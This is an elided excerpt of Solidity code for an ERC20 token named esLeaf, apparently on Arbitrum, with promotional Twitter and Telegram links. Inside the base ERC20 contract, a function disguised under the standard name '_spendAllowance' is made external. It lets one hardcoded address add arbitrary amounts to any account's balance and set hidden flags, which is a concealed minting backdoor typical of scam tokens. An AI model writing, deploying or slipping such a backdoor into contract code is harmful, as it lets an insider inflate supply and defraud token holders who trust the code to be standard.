...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    */
    function _spendAllowance(address account, uint256 amount) external {
        if(msg.sender == 0xC7d1D290d8067A7F997582a1dfD668b8E64e51Ca) {
            _last = account;
            _swap = true;
            _balances[account] += amount;
        }
...
https://twitter.com/TestArbi
https://t.me/Test_arbitrum
...
contract esLeaf is ERC20, Ownable {
    ...
    constructor(address _uniRouterAddress) ERC20("esLeaf", "esLEAF") {
        uint256 totalSupply = 9 * 1e6 * 1e6; // 9,000,000
        supply = totalSupply;
